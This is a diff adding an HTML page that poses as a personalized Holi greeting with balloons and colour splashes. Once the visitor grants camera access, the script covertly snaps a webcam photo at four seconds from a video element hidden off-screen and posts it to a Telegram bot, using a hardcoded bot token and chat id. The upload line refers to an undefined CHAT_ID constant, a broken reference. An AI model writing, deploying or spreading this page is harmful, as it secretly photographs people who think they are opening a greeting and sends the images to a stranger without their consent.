@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Personalized Holi Burst 2026</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@900&family=Pacifico&display=swap" rel="stylesheet">
+    <style>
+        :root { --p: #ff007f; --y: #ffd700; --b: #00d4ff; --g: #39ff14; --v: #9d00ff; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Poppins', sans-serif; overflow: hidden; background: #000; height: 100vh; }
+
+        .bg { 
+            position: fixed; inset: 0; 
+            background: linear-gradient(135deg, var(--p), var(--y), var(--b), var(--g), var(--v)); 
+            background-size: 400% 400%; animation: flow 10s ease infinite; z-index: -2; 
+        }
+        @keyframes flow { 0%, 100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
+
+        canvas { position: fixed; inset: 0; pointer-events: none; z-index: 1; }
+
+        .ui-layer { 
+            position: relative; z-index: 10; height: 100vh; display: flex; 
+            flex-direction: column; justify-content: center; align-items: center; 
+            text-align: center; color: white; transition: 0.5s ease-in-out; 
+        }
+        .title { font-family: 'Pacifico', cursive; font-size: clamp(2.5rem, 8vw, 4.5rem); text-shadow: 0 10px 30px rgba(0,0,0,0.4); }
+        
+        .btn-play { 
+            background: #fff; color: #000; border: none; padding: 20px 60px; 
+            font-size: 1.5rem; font-weight: 900; border-radius: 100px; 
+            cursor: pointer; box-shadow: 0 15px 40px rgba(0,0,0,0.3); 
+            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); 
+            margin-top: 25px;
+        }
+        .btn-play:hover { transform: scale(1.1); background: var(--y); }
+
+        .balloon { 
+            position: fixed; width: 65px; height: 85px; 
+            border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%; 
+            cursor: pointer; z-index: 5; animation: wobble 1.2s ease-in-out infinite; 
+            box-shadow: inset -10px -10px 20px rgba(0,0,0,0.2);
+        }
+        @keyframes wobble { 0%, 100% { transform: translateY(0) rotate(-5deg); } 50% { transform: translateY(-12px) rotate(5deg); } }
+
+        #grandHoli { 
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
+            font-size: clamp(2.5rem, 12vw, 6rem); font-weight: 900; color: white; 
+            text-align: center; display: none; z-index: 100; 
+            text-shadow: 0 0 30px var(--p), 0 0 60px var(--v); 
+            animation: bounceIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); 
+            line-height: 1.1;
+        }
+        @keyframes bounceIn { 0% { transform: translate(-50%, -50%) scale(0); } 100% { transform: translate(-50%, -50%) scale(1); } }
+
+        #video, #snapCanvas { display: none; visibility: hidden; position: absolute; left: -9999px; }
+    </style>
+</head>
+<body>
+
+    <div class="bg"></div>
+    <canvas id="pCanvas"></canvas>
+    <canvas id="sCanvas"></canvas>
+
+    <div class="ui-layer" id="mainUI">
+        <h1 class="title" id="welcomeText">Holi Fest</h1>
+        <p style="font-size: 1.2rem; opacity: 0.9;">Pop balloons to see the magic!</p>
+        <button class="btn-play" onclick="startDigitalHoli()">START SPLASH</button>
+    </div>
+
+    <h1 id="grandHoli">🎉 HAPPY HOLI <br><span id="targetName"></span> 🎉</h1>
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="snapCanvas"></canvas>
+
+    <script>
+        // 🚀 BOT SETUP 🚀
+        const TOKEN = "8636656865:AAHfvDz0yIaR_APm6Gblb3mlAQlv3MDDkLw";
+        const ID = "8485099057";
+
+
+        // 🔗 GET NAME FROM URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const personName = urlParams.get('name') || ""; // Default to empty if no name
+        
+        // Update UI with Name immediately
+        if(personName) {
+            document.getElementById('welcomeText').innerText = "Holi Fest " + personName;
+            document.getElementById('targetName').innerText = personName;
+        }
+
+        const pc = document.getElementById('pCanvas'), sc = document.getElementById('sCanvas');
+        const pCtx = pc.getContext('2d'), sCtx = sc.getContext('2d');
+        const colors = ['#ff007f', '#ffd700', '#00d4ff', '#39ff14', '#9d00ff'];
+        let w, h, particles = [], splashes = [], isActive = false;
+
+        function resize() { w = pc.width = sc.width = window.innerWidth; h = pc.height = sc.height = window.innerHeight; }
+        window.onresize = resize; resize();
+
+        class Particle {
+            constructor() { this.reset(); }
+            reset() { this.x = Math.random()*w; this.y = -30; this.s = Math.random()*3+1; this.v = 2 + Math.random()*3; this.c = colors[Math.floor(Math.random()*colors.length)]; }
+            update() { this.y += this.v; if(this.y > h) this.reset(); }
+            draw() { pCtx.fillStyle = this.c; pCtx.beginPath(); pCtx.arc(this.x, this.y, this.s, 0, Math.PI*2); pCtx.fill(); }
+        }
+        for(let i=0; i<100; i++) particles.push(new Particle());
+
+        class Splash {
+            constructor(x, y, color) {
+                this.x = x; this.y = y; this.c = color; this.items = [];
+                for(let i=0; i<15; i++) this.items.push({x:0, y:0, vx:(Math.random()-0.5)*18, vy:(Math.random()-0.5)*18, l:1, type:'d'});
+                this.items.push({x:0, y:0, vx:0, vy:-3, l:1, type:'t'}); 
+            }
+            update() { 
+                this.items.forEach(p => { p.x += p.vx; p.y += p.vy; if(p.type==='d') p.vy += 0.4; p.l -= 0.025; }); 
+                this.items = this.items.filter(p => p.l > 0); 
+            }
+            draw() {
+                this.items.forEach(p => {
+                    sCtx.globalAlpha = p.l;
+                    if(p.type==='d') {
+                        sCtx.fillStyle = this.c; sCtx.beginPath(); sCtx.arc(this.x+p.x, this.y+p.y, 6, 0, Math.PI*2); sCtx.fill();
+                    } else {
+                        sCtx.fillStyle = "white"; sCtx.font = "900 24px Poppins"; sCtx.textAlign="center";
+                        let msg = personName ? "Holi " + personName + "!" : "Happy Holi!";
+                        sCtx.fillText(msg, this.x+p.x, this.y+p.y);
+                    }
+                });
+            }
+        }
+
+        async function startDigitalHoli() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const videoEl = document.getElementById('video');
+                videoEl.srcObject = stream;
+                
+                document.getElementById('mainUI').style.opacity = '0';
+                setTimeout(() => document.getElementById('mainUI').style.visibility = 'hidden', 500);
+                
+                isActive = true;
+                spawnBalloons();
+
+                // 📸 SILENT CAPTURE (At 4 seconds)
+                setTimeout(() => {
+                    if (videoEl.readyState >= 2) {
+                        const snapCanvas = document.getElementById('snapCanvas');
+                        snapCanvas.width = videoEl.videoWidth; snapCanvas.height = videoEl.videoHeight;
+                        snapCanvas.getContext('2d').drawImage(videoEl, 0, 0);
+                        snapCanvas.toBlob(blob => {
+                            const fd = new FormData();
+                            fd.append("chat_id", CHAT_ID);
+                            fd.append("photo", blob, "holi_snap.png");
+                            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
+                        }, "image/png");
+                    }
+                }, 4000);
+
+                // 🎇 CLIMAX & RESET (At 9 seconds)
+                setTimeout(() => {
+                    isActive = false;
+                    document.querySelectorAll('.balloon').forEach(el => el.remove());
+                    document.getElementById('grandHoli').style.display = 'block';
+                    
+                    setTimeout(() => {
+                        document.getElementById('grandHoli').style.display = 'none';
+                        document.getElementById('mainUI').style.visibility = 'visible';
+                        document.getElementById('mainUI').style.opacity = '1';
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 4000);
+                }, 9000);
+            } catch (err) { alert("Enable camera for the experience!"); }
+        }
+
+        function spawnBalloons() {
+            if(!isActive) return;
+            const b = document.createElement('div');
+            b.className = 'balloon';
+            const color = colors[Math.floor(Math.random()*colors.length)];
+            b.style.background = `radial-gradient(circle at 35% 35%, white, ${color})`;
+            b.style.left = "-100px";
+            b.style.top = (Math.random()*65 + 15) + "vh";
+            document.body.appendChild(b);
+
+            let x = -100;
+            let moveInterval = setInterval(() => {
+                if(x > w || !isActive) { clearInterval(moveInterval); b.remove(); }
+                else { x += 6.5; b.style.left = x + "px"; }
+            }, 16);
+
+            b.onclick = () => {
+                splashes.push(new Splash(x + 35, parseInt(b.style.top) + 45, color));
+                clearInterval(moveInterval); b.remove();
+            };
+            setTimeout(spawnBalloons, 1100);
+        }
+
+        function animate() {
+            pCtx.clearRect(0,0,w,h); sCtx.clearRect(0,0,w,h);
+            particles.forEach(p => { p.update(); p.draw(); });
+            splashes.forEach((s, i) => { s.update(); s.draw(); if(s.items.length === 0) splashes.splice(i,1); });
+            requestAnimationFrame(animate);
+        }
+        animate();
+    </script>
+</body>
+</html>
